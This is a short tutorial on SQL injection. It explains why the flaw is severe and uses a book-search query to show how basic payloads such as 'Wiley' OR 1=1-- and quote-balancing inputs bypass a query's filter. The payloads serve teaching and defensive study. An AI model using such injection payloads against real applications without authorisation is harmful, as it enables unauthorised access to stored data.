# Injecting into SQL

Virtually every web application relies on a database to store critical information such as:

* User accounts, credentials, and personal data  
* Product information (titles, descriptions, pricing)  
* Orders, account history, payment details  
* User roles and privileges  

Applications typically use **Structured Query Language (SQL)** to interact with these databases. SQL is an **interpreted language**, and many applications dynamically build SQL statements by incorporating **user-supplied input**.

If this input is inserted into queries **without proper sanitization**, SQL injection (SQLi) vulnerabilities can arise.

---

## Severity of SQL Injection

SQL injection is among the most dangerous vulnerabilities:

* It allows unauthorized access to or manipulation of **all data** in the database.
* It can sometimes allow full compromise of the **underlying database server**.
* Although less prevalent today due to safer coding practices (e.g., prepared statements), SQLi **still appears in edge cases** where standard protections aren't applied.
* Detecting SQLi now often requires **subtle techniques and persistence**.

---

## Common SQL Databases in Web Apps

* **MySQL**
* **MS-SQL**
* **Oracle**

> These three platforms differ in syntax and behavior. The core principles of SQLi remain similar, but exploit techniques may need platform-specific adjustments.

---

### TIP

Whenever possible, use a **local installation** of the same database used by the target application. This helps you:

* Validate syntax and query structure.
* Understand incomplete or cryptic application responses.
* Experiment with built-in functions and system tables.

If local setup is not feasible, use platforms like:
* **[SQLzoo.net](https://sqlzoo.net)** — for quick interactive SQL testing.

---

## Exploiting a Basic SQL Injection Vulnerability

Consider a book search feature where users can search by publisher name. The backend query looks like:

```sql
SELECT author, title, year FROM books WHERE publisher = 'Wiley' AND published = 1
```

Here, `Wiley` is user-controlled input encapsulated in single quotes.

### Vulnerability Trigger: Special Characters in Input

When a user searches for:

```
O’Reilly
```

The generated query becomes:

```sql
SELECT author, title, year FROM books WHERE publisher = 'O’Reilly' AND published = 1
```

This causes a **syntax error** due to the unescaped apostrophe:

```
Incorrect syntax near 'Reilly'.
Unclosed quotation mark before the character string ‘.
```

Such behavior strongly suggests a SQL injection vulnerability.

---

## Attack Example: Returning All Records

If the attacker submits:
```
Wiley' OR 1=1--
```

The resulting query becomes:

```sql
SELECT author, title, year FROM books WHERE publisher = 'Wiley' OR 1=1--' AND published = 1
```

This effectively becomes:
```sql
SELECT author, title, year FROM books WHERE publisher = 'Wiley' OR 1=1
```

**Impact:**
* All records are returned because the condition `1=1` is always true.
* The `--` comment symbol causes the rest of the query to be ignored, avoiding a trailing quote error.

---

### TIP: Handling Trailing Quotes Without Comments

Instead of using `--`, attackers can **balance the quotes**:

Input:
```
Wiley' OR 'a'='a
```

Query:
```sql
SELECT author, title, year FROM books WHERE publisher = 'Wiley' OR 'a'='a' AND published = 1
```

* Still valid SQL.
* Achieves the same result of bypassing filtering logic.

---

## Key Takeaway

Even a **basic SQL injection** that simply bypasses a query filter (like showing unpublished books) is dangerous.

* It may allow **access control bypass**.
* It can escalate to **data extraction**, **user impersonation**, or even **remote code execution**.
* Therefore, **any** SQL injection vulnerability must be treated as **critically severe**, regardless of its apparent context.
